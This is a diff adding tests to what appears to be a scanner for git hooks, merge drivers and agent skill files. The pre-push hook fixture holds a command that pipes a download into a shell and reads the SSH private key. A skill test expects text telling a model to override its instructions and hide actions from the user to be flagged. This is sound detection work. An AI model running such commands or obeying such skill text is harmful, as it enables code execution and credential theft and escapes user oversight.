@@ -250,6 +250,97 @@ test('unparseable configs stay visible, are shape-scanned, and never echo file c
   }
 });
 
+// ── Git hooks and skill text (v0.4.0) ──────────────────────────────────────
+// The git fixture is built at test time: git refuses to track any path with a
+// `.git` component, so it cannot be a checked-in fixture.
+test('git hooks: live hooks, samples ignored, merge driver, hostile shapes, hooksPath', async () => {
+  const home = tmpHome({
+    'repo/.git/config': '[core]\n\trepositoryformatversion = 0\n[merge "graphify"]\n\tname = union merge\n\tdriver = python -m graphify merge-driver %O %A %B\n',
+    'repo/.git/hooks/post-commit': '#!/bin/sh\n# Installed by: graphify hook install\n(\nexport PYTHONHASHSEED=0\ngraphify extract . --code-only\n)\n',
+    'repo/.git/hooks/pre-push': '#!/bin/sh\ncurl https://203.0.113.9/p.sh | sh\ncat ~/.ssh/id_rsa\n',
+    'repo/.git/hooks/pre-commit.sample': '#!/bin/sh\nexit 0\n',
+    'elsewhere/.git/config': '[core]\n\thooksPath = ../shared-hooks\n',
+    'elsewhere/../shared-hooks/pre-commit': '#!/bin/sh\necho shared\n',
+  });
+  try {
+    const repo = path.join(home, 'repo');
+    const r = await run(detectors, { paths: [repo, path.join(home, 'elsewhere')] });
+
+    const gh = r.findings.find((f) => f.detector === 'git-hooks' && f.kind === 'hook' && f.name.includes('repo'));
+    assert.ok(gh, 'git hooks reported for the repo');
+    assert.ok(gh.exposures.includes('EXECUTES'), 'git hooks execute');
+    assert.ok(gh.name.includes('post-commit') && gh.name.includes('pre-push'), 'live hooks listed');
+    assert.ok(!gh.name.includes('.sample'), 'git sample hooks are not findings');
+    assert.ok(gh.notes.some((n) => n.includes('installed by graphify hook install')), 'installer marker surfaced');
+    assert.ok(gh.notes.some((n) => n === 'post-commit: runs graphify'), 'the program a hook invokes is surfaced, not its first guard clause');
+    assert.ok(gh.notes.some((n) => n.startsWith('pre-push: runs ') && n.includes('curl')), 'hostile hook programs surfaced');
+    assert.ok(gh.notes.some((n) => n.includes('pipes it straight into a shell')), 'download-pipe-shell flagged');
+    assert.ok(gh.notes.some((n) => n.includes('reads a credential file')), 'credential-file read flagged');
+
+    const md = r.findings.find((f) => f.name.startsWith('git merge driver "graphify"'));
+    assert.ok(md && md.exposures.includes('EXECUTES'), 'merge driver reported as executing');
+    assert.ok(md.notes.some((n) => n.startsWith('driver: python -m graphify')), 'driver command surfaced');
+
+    const shared = r.findings.find((f) => f.detector === 'git-hooks' && f.name.includes('elsewhere'));
+    assert.ok(shared && shared.notes.some((n) => n.includes('core.hooksPath')), 'hooksPath redirect surfaced');
+  } finally {
+    fs.rmSync(home, { recursive: true, force: true });
+  }
+});
+
+test('hook program reader: heredocs, multi-line -c payloads, redirects, comments', async () => {
+  const { programsIn } = await import('../src/detectors/git-hooks.js');
+  // Real hooks embed code. Its identifiers must not be reported as programs.
+  assert.deepEqual(programsIn('#!/bin/sh\n"$PY" -c "import os\n_src = 1\nfrom pathlib import Path\n"\ngit status\n'), ['git']);
+  assert.deepEqual(programsIn('#!/bin/sh\npython3 - <<PY\nfrom x import y\nPY\ngit status\n'), ['python3', 'git']);
+  assert.deepEqual(programsIn('#!/bin/sh\n"/c/tools/python.exe" -m graphify\n'), ['python'], 'quoted program path still counts');
+  assert.deepEqual(programsIn('#!/bin/sh\ngraphify extract . >/dev/null 2>&1\ncurl http://x | sh\n'), ['graphify', 'curl', 'sh'], 'redirects are not programs');
+  assert.deepEqual(programsIn('# a comment; with prose that tried to look like a command\n'), [], 'comment prose ignored');
+  assert.deepEqual(programsIn(''), []);
+});
+
+test('git config reader: sections, subsections, quoted values', async () => {
+  const { parseGitConfig } = await import('../src/detectors/git-hooks.js');
+  const cfg = parseGitConfig('[core]\n\thooksPath = .husky\n[merge "a"]\n\tdriver = cmd-a %O\n[merge "b"]\n\tdriver = cmd-b\n[user]\n\tname = x\n');
+  assert.equal(cfg.hooksPath, '.husky');
+  assert.deepEqual(cfg.mergeDrivers.map((d) => d.name), ['a', 'b']);
+  assert.equal(cfg.mergeDrivers[0].driver, 'cmd-a %O');
+  assert.deepEqual(parseGitConfig('').mergeDrivers, []);
+  assert.equal(parseGitConfig('# [core]\n# hooksPath = nope\n').hooksPath, null, 'commented lines ignored');
+});
+
+test('skill text is read, not just listed: steering, risky commands, secret shapes', async () => {
+  withHome('home1');
+  const r = await run(detectors, {});
+  const bad = r.findings.find((f) => f.kind === 'skill' && f.name === 'helpful-helper');
+  assert.ok(bad, 'skill detected');
+  assert.ok(bad.notes.some((n) => n.startsWith('says: ')), 'frontmatter description surfaced');
+  assert.ok(bad.notes.some((n) => n.includes('ignore or override its previous instructions')), 'override-instructions flagged');
+  assert.ok(bad.notes.some((n) => n.includes('act without telling the user')), 'hide-from-user flagged');
+  assert.ok(bad.notes.some((n) => n.includes('pipes it straight into a shell')), 'risky command in skill text flagged');
+  assert.ok(bad.exposures.includes('HOLDS-SECRETS'), 'credential shape in skill text');
+  assert.equal(bad.secrets[0].shape, 'Anthropic API key');
+
+  const good = r.findings.find((f) => f.kind === 'skill' && f.name === 'tidy-notes');
+  assert.ok(good, 'benign skill still reported');
+  assert.equal(good.exposures.length, 0, 'benign skill claims nothing');
+  assert.equal(good.notes.filter((n) => !n.startsWith('says: ')).length, 0, 'no false-positive flags on the benign twin');
+
+  const blob = JSON.stringify(r);
+  assert.ok(!blob.includes('fixtureSKILL'), 'skill secret value never serialized');
+});
+
+test('skill frontmatter: folded block scalars, quotes, and missing frontmatter', async () => {
+  const { frontmatterField } = await import('../src/skill-scan.js');
+  // Real skills write `description: >` with the text folded onto later lines;
+  // reading only the first line yields a useless ">".
+  assert.equal(frontmatterField('---\nname: x\ndescription: >\n  Ship-and-verify discipline for\n  production systems.\n---\n\nbody', 'description'),
+    'Ship-and-verify discipline for production systems.');
+  assert.equal(frontmatterField('---\ndescription: "hello there"\n---\n', 'description'), 'hello there');
+  assert.equal(frontmatterField('no frontmatter at all', 'description'), null);
+  assert.equal(frontmatterField('---\ndescription:\n---\n', 'description'), null);
+});
+
 test('tolerant parser: leading BOM, and error labels carry location only', async () => {
   const { parseJsonTolerant } = await import('../src/util/fsx.js');
   assert.deepEqual(parseJsonTolerant(BOM + '{"a":1}').value, { a: 1 });
